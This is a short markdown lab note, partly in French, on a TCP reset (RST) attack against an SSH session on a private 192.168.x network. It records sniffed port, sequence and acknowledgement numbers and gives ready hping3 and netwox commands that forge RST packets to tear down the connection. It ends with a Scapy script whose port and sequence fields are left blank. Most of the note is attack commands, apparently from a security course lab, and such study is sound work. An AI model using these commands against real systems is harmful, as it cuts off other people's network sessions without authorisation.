# RST attack

tcp.srcport= 33176
tcp.seq=2713
tcp.ack = 3047

## hping3
```
sudo hping3 192.168.199.159 -p 22 -s 33176 -R -A -M 2713 -L 3047 -c 2
```
## netwox
```
sudo netwox 40 -l 192.168.199.156 -m 192.168.199.159 -o 33176 -p 22 -B –tcp-acknum 3047 --tcp-seqnum 2713
```

## En utilisant Python Scapy:
```
#!/usr/bin/python3
from scapy.all import *
ip = IP(src="192.168.199.159", dst="192.168.199.156")
tcp = TCP(sport=, dport=, flags='R', seq=, ack=) #rst_flag=4
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)
```
